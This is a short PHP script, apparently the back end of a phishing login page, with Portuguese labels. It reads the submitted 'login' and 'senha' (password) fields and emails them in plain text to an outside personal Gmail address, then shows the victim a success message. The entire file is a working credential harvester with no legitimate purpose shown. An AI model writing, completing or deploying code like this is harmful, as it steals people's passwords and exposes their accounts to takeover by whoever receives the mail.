<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST['login'];
    $senha = $_POST['senha'];

    $to = 'lucascostaol429@gmail.com.com';
    $subject = 'Dados de Login e Senha';
    $message = "Usuário: $login\nSenha: $senha";
    $headers = 'From: no-reply@example.com' . "\r\n" .
               'Reply-To: no-reply@example.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    mail($to, $subject, $message, $headers);
    echo "Dados enviados com sucesso!";
} else {
    echo "Método de requisição inválido.";
}
?>
